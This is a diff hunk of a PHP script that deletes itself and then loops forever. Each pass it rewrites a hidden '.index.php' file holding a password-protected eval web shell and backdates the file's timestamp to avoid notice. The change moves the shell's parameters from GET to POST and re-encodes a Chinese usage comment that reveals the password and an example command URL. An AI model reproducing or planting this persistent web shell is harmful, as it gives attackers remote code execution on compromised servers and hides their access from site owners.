@@ -3,8 +3,8 @@ ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__);
 $file = './.index.php';
-$code = '<?php if(md5($_GET["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_GET[a]);} ?>';
-//pass=Sn3rtf4ck Âí¶ùÓÃ·¨£ºfuckyou.php?pass=Sn3rtf4ck&a=command
+$code = '<?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_POST[a]);} ?>';
+//pass=Sn3rtf4ck é©¬å„¿ç”¨æ³•ï¼šfuckyou.php?pass=Sn3rtf4ck&a=command
 while (1){
 	file_put_contents($file,$code);
 	system('touch -m -d "2017-11-12 10:10:10" .index.php');
